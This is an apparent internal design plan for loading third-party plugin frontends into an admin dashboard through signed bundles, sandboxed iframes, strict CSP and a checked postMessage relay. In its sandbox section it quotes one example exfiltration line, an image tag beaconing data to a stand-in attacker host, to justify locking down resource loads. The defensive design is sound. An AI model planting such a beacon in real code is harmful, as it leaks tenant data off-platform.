# 08 — Frontend runtime and dynamic loading

## Completion document

When this plan step is completed, write
`complete/08-frontend-runtime-and-dynamic-loading.complete.md`.

---

D5 requires installing a plugin to never mean rebuilding the core admin bundle. This document is
how that actually works, and how the resulting bundle is kept from being a security hole in the
admin dashboard itself (05 §9).

Everything here — signed, integrity-checked bundles, the iframe sandbox, the CSP — is written
against the admin dashboard, but is reused **unchanged** for a
[public site slot](06-extension-points-and-hooks.md) §2.1 ([16](16-example-plugin-cookie-consent.md)
is the first plugin to need one): the published website embeds the same kind of sandboxed iframe
loading the same kind of signed bundle, just inside a tenant's public page instead of the admin
shell. The only thing that differs is the RPC surface a public-site iframe is allowed to reach —
narrower, and gated separately ([05 §12](05-security-and-sandboxing.md)) — not the sandboxing
itself, which does not get weaker just because the audience changed from an authenticated admin to
an anonymous visitor.

One CSP detail does differ, for a stated reason rather than an oversight: §3's `connect-src 'none'`
exists because the admin iframe must never make its own call — every data need is relayed through
`postMessage` to the admin shell, which alone holds the session/CSRF context worth protecting
(§4). A public page has no equivalent trusted parent to relay through (the surrounding markup is
just the tenant's own published page, not platform code) and no session to protect on an anonymous
call, so a `site.global` iframe's `connect-src` is instead scoped narrowly to its own plugin's
public endpoint (`/plugins/{slug}/public/...`, same tenant domain) and calls it directly — detailed
in [05 §12](05-security-and-sandboxing.md). Every other CSP directive in §3 is unchanged.

## 1. Build constraints on a plugin's frontend bundle

A plugin ships one file, `frontend/dist/main.js` (04 §1) — a single ESM bundle the developer
builds with their own tooling, subject to constraints the review pipeline checks
([10 §3](10-review-and-publishing-pipeline.md)):

- No bundled copy of a large shared runtime (React, a full UI framework) — if the Plugin Host
  offers a shared UI toolkit later, it will be as an import map the host provides, keeping every
  plugin bundle small; the first delivery does not require this and a plugin may be plain
  DOM/vanilla TS.
- No `eval`, no `new Function(...)`, no remote script injection (`<script src=...>` pointed at a
  URL not declared as an `http.egress`-approved host) — checked statically, and moot at runtime
  regardless because of the iframe's Content-Security-Policy (§3).
- Must run entirely inside the iframe's sandboxed origin — no assumption of `window.top` access,
  because it will not have any (§3).

## 2. How the bundle reaches the browser

1. On install (07 §4), the release's `frontend_bundle_path` and `frontend_bundle_sha256`
   ([03 §1](03-database-schema.md)) are recorded against the tenant's install.
2. The admin shell, on each load, reads the tenant's **active** installs with a `frontend` entry
   and their nav declarations (04 §2) — this is the one runtime read that determines what appears
   in the **Plugins** area of the sidebar; it does not require touching `views.ts` (01 §2) because
   the sidebar entries for plugins are generated from this data, not statically registered per
   plugin.
3. Navigating to a plugin's nav entry triggers a **signed, versioned URL** fetch of the bundle
   (e.g. `/portal/plugin-assets/{slug}/{version}/main.js`), served with a `Subresource-Integrity`
   attribute matching `frontend_bundle_sha256` — a byte-for-byte tampering of the served file,
   whether by a compromised CDN, a storage bug, or a database row edited by hand, fails the
   browser's own integrity check and the script never executes.
4. The Plugin Host (§3) performs the dynamic `import()` **inside the iframe's document**, never in
   the admin dashboard's own document — so even a bundle that somehow passed integrity checking
   while carrying malicious code runs inside the sandbox, not next to the session.

## 3. The iframe sandbox

Every plugin UI slot ([06 §2](06-extension-points-and-hooks.md)) — nav-linked full page,
dashboard widget, or settings panel — renders inside its own `<iframe>`, not inline in the admin
document:

- `sandbox="allow-scripts"` and nothing else by default (no `allow-same-origin`, no
  `allow-top-navigation`, no `allow-forms` unless a slot's contract specifically needs it) — the
  iframe's effective origin is opaque and distinct from the admin dashboard's own origin, so even
  a bug in same-origin policy handling elsewhere cannot let the plugin script read the parent
  document, cookies, or `localStorage`.
- Served from a **separate subdomain or a `null`-origin `srcdoc`**, not `www`'s own origin — so a
  plugin script cannot inherit any ambient cookie the admin dashboard's own domain sets, even
  before considering the `sandbox` attribute.
- A strict `Content-Security-Policy` inside the iframe response, **default-deny with named
  carve-outs, not an allowlist of a few directives**: `default-src 'none'` as the base, then
  exactly `script-src` (limited to the bundle's own integrity hash), `connect-src 'none'`
  (explicit, not merely implied by the default — the plugin never makes its own `fetch` call to
  the platform, see §4's RPC-only model), and `frame-ancestors` limited to the admin dashboard's
  own origin (so the iframe cannot be embedded anywhere else, protecting against a plugin UI being
  used as a phishing surface off-platform). **`img-src`, `style-src`, `font-src`, and `media-src`
  are `'none'` unless a slot's contract specifically grants one** — a bare `connect-src 'none'`
  is not, by itself, a data-exfiltration boundary: an `<img src="https://attacker.example/beacon?d=...">`
  or a `background: url(...)` is a resource load, governed by `img-src`/`style-src`, not
  `connect-src`, and a plugin with legitimate read access to tenant data through an approved
  capability (§4) could otherwise leak it off-platform through exactly that path without ever
  making a `fetch` call the CSP would catch. If a plugin's UI genuinely needs an image (an icon
  bundled with its own assets), that asset is served from the platform's own plugin-asset host and
  `img-src` is scoped to that one origin — never `*` or an origin the plugin's manifest names.

This is the frontend mirror of [05 §2](05-security-and-sandboxing.md)'s backend trust boundary:
**the plugin's UI code runs somewhere that has nothing to steal**, exactly like the Plugin
Runtime having no shared-database credential.

## 4. Why the plugin frontend never calls the platform's API directly

A plugin's iframe has no `connect-src` at all (§3) — it cannot make its own `fetch`/`XHR` calls to
`/portal/api/...` even if it wanted to, because the CSP forbids it and because it holds no session
credential to authenticate such a call with (the iframe's opaque origin gets no cookies). Instead:

- Every data need goes through `postMessage` to the parent, which relays it to the same
  capability-scoped API the backend Plugin Runtime uses ([05 §4](05-security-and-sandboxing.md)) —
  **one authorization path for both the plugin's PHP and its frontend**, not two independently
  maintained ones that could drift.
- The parent (the admin dashboard's own trusted code, not the plugin) attaches the tenant's
  session/CSRF context to the relayed request — the plugin never sees a credential it could leak.
- **The relay handler verifies `event.source` against the exact iframe `window` instance it
  created for that specific install, and `event.origin` against that iframe's expected sandboxed
  origin, before relaying anything** — matched by the instance the parent itself mounted, never by
  a value the message payload claims (a message claiming to be `install_id: 42` is worthless if
  `event.source` is not literally the window the parent opened for install 42's iframe). Without
  this, one plugin's iframe — or any other script able to `postMessage` into the parent's window —
  could shape a message to look like a different, more-trusted plugin's capability call, and the
  parent would relay it under that plugin's grants instead of the sender's. This check is what
  makes the RPC channel a per-plugin boundary rather than a shared mailbox every iframe can write
  into; it is exercised directly in the hostile-plugin test suite
  ([14 §2](14-rollout-and-testing.md)).

## 5. The `plugin-host` contract — this plan's `portal.d.ts`

Following the precedent [01 §7](01-current-state-audit.md) documents for `external/api`'s
`portal.d.ts`: a hand-maintained TypeScript declaration file, `plugin-host.d.ts`, published for
developers to build against, declaring the full `postMessage` RPC surface (§4) and nothing else —
no ambient globals, no `window.Portal`-style runtime object, because the iframe has no shared
runtime context with the host to expose one into. A plugin's `frontend/dist/main.js` imports
**types only** from this declaration (development-time), and talks to the parent exclusively
through the RPC helper the declaration types, e.g.:

```ts
// plugin-host.d.ts (excerpt — types only, no implementation shipped to plugins)
export interface PluginHost {
  call<K extends keyof PluginCapabilityMap>(
    capability: K,
    args: PluginCapabilityMap[K]['args']
  ): Promise<PluginCapabilityMap[K]['result']>;
  toast(message: string, level: 'info' | 'success' | 'danger'): void;
  navigate(path: string): void;
}
```

Kept in lockstep with the capability catalog ([05 §4](05-security-and-sandboxing.md)) and the
extension-point catalog version ([06 §4](06-extension-points-and-hooks.md)) the same way
`portal.d.ts` is kept in lockstep with the externals API surface per
[AGENTS.md §4](../../../w/AGENTS.md): **when the capability surface changes, `plugin-host.d.ts`
changes in the same pass**, or a developer's build is checking types against a contract that no
longer matches what the runtime will actually allow.

## 6. What this deliberately gives up, and why it's worth it

- **No plugin can build a frontend experience indistinguishable from a first-party page** in the
  sense of directly manipulating the admin shell's own DOM, reusing its exact component styling
  primitives at the pixel level, or intercepting the shell's own routing — it renders inside its
  own framed region. This is the cost of D5 combined with G2; a marketplace plugin ecosystem that
  can freely manipulate the host page is one WordPress's own plugin-caused defacement and
  credential-theft incidents show the cost of.
- **A slightly heavier per-navigation cost** (an iframe boot + a fresh bundle fetch) versus a
  statically bundled first-party view. Acceptable given this is third-party code opted into per
  plugin, not the default path for every screen.

## Phases

| Phase | Deliverable | Done when |
|---|---|---|
| **P0** | Plugin-asset serving route with SRI, `plugin-host.d.ts` v1 published | A bundle served with a mismatched hash fails to load in a real browser, not just in a test assertion |
| **P1** | Iframe sandbox with the CSP in §3, RPC relay in the parent | A plugin iframe cannot read `document.cookie`, `localStorage`, or `window.parent`'s properties in a manual adversarial test |
| **P2** | Sidebar/nav generation from installed-plugin data (§2) | Installing a plugin with a `frontend.nav` entry adds a sidebar item with no admin bundle rebuild |
| **P3** | `dashboard.widget` and `settings.panel` slots | Both render through the same iframe/RPC path as the nav-linked full page, with no separate, less-restricted code path |
